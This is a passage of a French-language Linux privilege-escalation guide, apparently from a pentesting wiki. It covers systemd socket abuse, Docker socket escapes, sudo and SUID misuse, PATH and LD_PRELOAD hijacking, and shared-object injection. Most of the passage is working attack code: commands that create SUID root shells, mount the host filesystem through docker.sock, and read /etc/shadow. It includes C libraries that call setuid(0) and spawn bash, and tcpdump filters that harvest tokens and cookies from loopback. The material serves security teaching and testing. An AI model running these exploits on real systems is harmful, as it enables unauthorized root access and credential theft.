- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options diffèrent, mais de manière générale elles servent à **indiquer où le socket va écouter** (le chemin du fichier de socket AF_UNIX, l'IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept` : Prend un argument booléen. Si **true**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **false**, tous les sockets d'écoute sont **passés à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFO où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut : false**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux daemons uniquement d'une manière compatible avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : Acceptent une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la création et le bind des **sockets**/FIFO, respectivement. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi des arguments pour le processus.
- `ExecStopPre`, `ExecStopPost` : Commandes supplémentaires qui sont **exécutées avant** ou **après** la fermeture et la suppression des **sockets**/FIFO, respectivement.
- `Service` : Spécifie le nom de l'unité de **service** à **activer** lors du **trafic entrant**. Ce paramètre n'est autorisé que pour les sockets avec `Accept=no`. Par défaut, il prend le service qui porte le même nom que le socket (le suffixe étant remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Writable .socket files

Si vous trouvez un fichier `.socket` **modifiable**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et le backdoor sera exécuté avant la création du socket. Par conséquent, vous devrez **probablement attendre que la machine soit redémarrée.**\
_Notez que le système doit utiliser cette configuration de fichier socket sinon le backdoor ne sera pas exécuté_

### Socket activation + writable unit path (create missing service)

Une autre mauvaise configuration à fort impact est :

- une unité socket avec `Accept=no` et `Service=<name>.service`
- l'unité de service référencée est manquante
- un attaquant peut écrire dans `/etc/systemd/system` (ou un autre chemin de recherche d'unités)

Dans ce cas, l'attaquant peut créer `<name>.service`, puis générer du trafic vers le socket pour que systemd charge et exécute le nouveau service en tant que root.

Flux rapide :
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets accessibles en écriture

Si vous **identifiez un socket accessible en écriture** (_nous parlons ici des Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation :**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Notez qu'il peut y avoir des **sockets listening for HTTP** requests (_Je ne parle pas des fichiers .socket mais des fichiers faisant office de unix sockets_). Vous pouvez vérifier cela avec :
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si le socket **répond à une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut‑être **exploiter une vulnérabilité**.

### Writable Docker Socket

Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est inscriptible par l'utilisateur `root` et les membres du groupe `docker`. Avoir un accès en écriture à ce socket peut conduire à une élévation de privilèges. Voici un aperçu de la façon dont cela peut être réalisé et des méthodes alternatives si le Docker CLI n'est pas disponible.

#### **Élévation de privilèges avec Docker CLI**

Si vous avez un accès en écriture au socket Docker, vous pouvez élever vos privilèges en utilisant les commandes suivantes:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d'exécuter un conteneur avec un accès root au système de fichiers de l'hôte.

#### **Utiliser l'API Docker directement**

Dans les cas où le Docker CLI n'est pas disponible, le Docker socket peut toujours être manipulé en utilisant le Docker API et des commandes `curl`.

1.  **Lister les images Docker :** Récupérer la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Créer un conteneur :** Envoyer une requête pour créer un conteneur qui monte le répertoire racine de l'hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrer le conteneur nouvellement créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Se connecter au conteneur :** Utilisez `socat` pour établir une connexion au conteneur, permettant l'exécution de commandes à l'intérieur.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir établi la connexion `socat`, vous pouvez exécuter des commandes directement dans le conteneur avec un accès root au système de fichiers de l'hôte.

### Autres

Notez que si vous avez des permissions d'écriture sur le docker socket parce que vous êtes **dans le groupe `docker`** vous avez [**d'autres moyens d'escalader les privilèges**](interesting-groups-linux-pe/index.html#docker-group). Si la [**docker API écoute sur un port** vous pouvez aussi être en mesure de la compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **d'autres façons de sortir des conteneurs ou d'abuser des runtimes de conteneurs pour escalader les privilèges** dans :


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) élévation de privilèges

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges** :


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** élévation de privilèges

Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges** :


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d'interagir efficacement et de partager des données. Conçu pour les systèmes Linux modernes, il offre un cadre robuste pour différentes formes de communication entre applications.

Le système est polyvalent, supportant une IPC basique qui améliore l'échange de données entre processus, rappelant les **UNIX domain sockets** améliorés. De plus, il facilite la diffusion d'événements ou de signaux, favorisant une intégration fluide entre les composants système. Par exemple, un signal d'un démon Bluetooth concernant un appel entrant peut inciter un lecteur multimédia à se mettre en sourdine, améliorant ainsi l'expérience utilisateur. D-Bus prend également en charge un système d'objets distants, simplifiant les requêtes de service et les invocations de méthodes entre applications, rationalisant des processus traditionnellement complexes.

D-Bus fonctionne sur un modèle **allow/deny**, gérant les permissions des messages (appels de méthode, émission de signaux, etc.) en fonction de l'effet cumulatif des règles de politique correspondantes. Ces politiques spécifient les interactions avec le bus, pouvant potentiellement permettre une élévation de privilèges par l'exploitation de ces permissions.

Un exemple d'une telle politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions pour l'utilisateur root d'own, send to, et receive des messages de `fi.w1.wpa_supplicant1`.

Les politiques sans utilisateur ou groupe spécifié s'appliquent universellement, tandis que les politiques de contexte "default" s'appliquent à tous ceux qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez comment énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rapide du filtrage sortant

Si l'hôte peut exécuter des commandes mais que les callbacks échouent, distinguez rapidement le filtrage DNS, transport, proxy et de routage :
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ports ouverts

Vérifiez toujours les services réseau en cours d'exécution sur la machine avec lesquels vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classer les listeners par bind target:

- `0.0.0.0` / `[::]`: exposé sur toutes les interfaces locales.
- `127.0.0.1` / `::1`: accessible uniquement localement (bons candidats pour tunnel/forward).
- Adresses IP internes spécifiques (p. ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): généralement accessibles uniquement depuis des segments internes.

### Flux de triage pour services accessibles uniquement localement

Lorsque vous compromettez un hôte, les services liés à `127.0.0.1` deviennent souvent atteignables pour la première fois depuis votre shell. Un flux de triage local rapide est :
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS en tant que scanner réseau (mode réseau uniquement)

En plus des local PE checks, linPEAS peut être exécuté comme un scanner réseau ciblé. Il utilise les binaires disponibles dans `$PATH` (typiquement `fping`, `ping`, `nc`, `ncat`) et n'installe pas de tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si vous passez `-d`, `-p`, ou `-i` sans `-t`, linPEAS se comporte comme un simple network scanner (skipping the rest of privilege-escalation checks).

### Sniffing

Vérifiez si vous pouvez sniff traffic. Si c'est le cas, vous pourriez récupérer des credentials.
```
timeout 1 tcpdump
```
Vérifications pratiques rapides :
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) est particulièrement utile en post-exploitation, car de nombreux services accessibles uniquement en interne y exposent des tokens/cookies/credentials :
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capturez maintenant, analysez plus tard:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont dans les systèmes, lesquels peuvent **login** et lesquels ont des **privilèges root** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID élevé

Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec **UID > INT_MAX** d'escalader leurs privilèges. Plus d'infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le en utilisant :** **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder les privilèges root :


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous connecter pour chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de produire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur la machine, vous pouvez essayer de brute-forcer un utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` tente également de brute-forcer des utilisateurs.

## Abus du $PATH inscriptible

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH** vous pouvez peut-être escalader vos privilèges en **créant une backdoor dans le dossier inscriptible** portant le nom d'une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui **n'est pas chargée depuis un dossier situé avant** votre dossier inscriptible dans le $PATH.

### SUDO and SUID

Il se peut que l'on vous autorise à exécuter certaines commandes avec sudo ou que des fichiers aient le bit suid. Vérifiez-le en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines **commandes inattendues vous permettent de lire et/ou d'écrire des fichiers ou même d'exécuter une commande.** Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration Sudo peut permettre à un utilisateur d'exécuter une commande avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`, il est alors trivial d'obtenir un shell en ajoutant une clé ssh dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **set an environment variable** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur HTB machine Admirer**, était **vulnérable** au **PYTHONPATH hijacking** permettant de charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root :
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV préservé via sudo env_keep → root shell

Si sudoers préserve `BASH_ENV` (par ex., `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l'invocation d'une commande autorisée.

- Why it works: Pour les shells non-interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script cible. Beaucoup de règles sudo permettent d'exécuter un script ou un wrapper shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.

- Conditions requises :
- Une règle sudo que vous pouvez exécuter (n'importe quelle cible qui invoque `/bin/bash` de manière non interactive, ou tout script bash).
- `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Durcissement:
- Retirer `BASH_ENV` (et `ENV`) de `env_keep`, privilégier `env_reset`.
- Éviter les wrappers shell pour les commandes autorisées via sudo ; utiliser des binaires minimaux.
- Envisager la journalisation I/O de sudo et les alertes lorsque des variables d'environnement préservées sont utilisées.

### Terraform via sudo avec HOME préservé (!env_reset)

Si sudo laisse l'environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l'utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.

- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform échouera le Go plugin handshake mais exécutera la payload en root avant de mourir, laissant un SUID shell derrière.

### TF_VAR overrides + contournement de la validation des symlinks

Les variables Terraform peuvent être fournies via les variables d'environnement `TF_VAR_<name>`, qui survivent lorsque sudo préserve l'environnement. Des validations faibles telles que `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform résout le symlink et copie le vrai `/root/root.txt` dans une destination lisible par l'attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en pré-créant des symlinks de destination (par ex., en pointant le provider’s destination path à l'intérieur de `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines distributions plus anciennes, sudo peut être configuré avec `requiretty`, ce qui oblige sudo à s'exécuter uniquement depuis un TTY interactif. Si `!requiretty` est défini (ou l'option est absente), sudo peut être exécuté depuis des contextes non-interactifs tels que reverse shells, cron jobs, or scripts.
```bash
Defaults !requiretty
```
Ce n'est pas une vulnérabilité directe en soi, mais cela étend les situations dans lesquelles des règles sudo peuvent être abusées sans nécessiter un PTY complet.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées inscriptibles par un attaquant (par exemple, `/home/<user>/bin`), toute commande relative à l'intérieur de la cible autorisée par sudo peut être masquée.

- Prérequis : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemins absolus (`free`, `df`, `ps`, etc.) et une entrée PATH inscriptible par l'attaquant qui est recherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo : contournement de l'exécution via les chemins
**Jump** pour lire d'autres fichiers ou utiliser **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c'est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sans chemin de commande

Si la **sudo permission** est accordée pour une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_ vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut aussi être utilisée si un **suid** binaire **exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d'un binaire SUID suspect)**).

[Payload examples to execute.](payloads-to-execute.md)

### Binaire SUID avec chemin de la commande

Si le **suid** binaire **exécute une autre commande en spécifiant le chemin**, vous pouvez essayer de **export a function** nommée comme la commande que le fichier suid appelle.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée

### Script modifiable exécuté par un wrapper SUID

Une mauvaise configuration courante d'une custom-app est un wrapper binaire SUID appartenant à root qui exécute un script, alors que le script lui-même est writable par des low-priv users.

Schéma typique:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` est modifiable en écriture, vous pouvez y ajouter des commandes payload puis exécuter le SUID wrapper :
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vérifications rapides:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ce vecteur d'attaque est particulièrement courant dans les wrappers "maintenance"/"backup" fournis dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** sert à spécifier une ou plusieurs bibliothèques partagées (.so files) qui seront chargées par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est connu sous le nom de préchargement d'une bibliothèque.

Cependant, pour préserver la sécurité du système et empêcher que cette fonctionnalité soit exploitée, en particulier avec des exécutables **suid/sgid**, le système impose certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables dont l'ID utilisateur réel (_ruid_) ne correspond pas à l'ID utilisateur effectif (_euid_).
- Pour les exécutables avec suid/sgid, seules les bibliothèques situées dans des chemins standards qui sont elles-mêmes suid/sgid sont préchargées.

Une escalation de privilèges peut se produire si vous avez la possibilité d'exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut l'instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être reconnue même lorsque des commandes sont exécutées avec `sudo`, pouvant potentiellement conduire à l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrer sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite, **compilez-le** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escalate privileges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Une privesc similaire peut être exploitée si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH**, car il contrôle le chemin où les bibliothèques seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Lorsqu'on rencontre un binary avec les permissions **SUID** qui semble inhabituel, il est conseillé de vérifier s'il charge correctement les fichiers **.so**. Cela se vérifie en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère une possibilité d'exploitation.

Pour exploiter cela, on procéderait en créant un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions des fichiers et en lançant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus en un fichier shared object (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l'exécution du binaire SUID affecté devrait déclencher l exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID chargeant une bibliothèque depuis un dossier où nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Cela signifie que la bibliothèque que vous avez générée doit contenir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qui peuvent être exploités par un attaquant pour contourner des restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet répertorie des fonctionnalités légitimes des binaires Unix qui peuvent être détournées pour sortir de shells restreints, élever ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind and reverse shells, et faciliter d'autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez exécuter `sudo -l`, vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo.

### Reusing Sudo Tokens

Dans les cas où vous avez un **accès sudo** mais pas le mot de passe, vous pouvez escalader les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.

Conditions requises pour escalader les privilèges :

- Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose dans les **15 dernières minutes** (par défaut, c'est la durée du token sudo qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` est 0
- `gdb` est accessible (vous pouvez être en mesure de le téléverser)

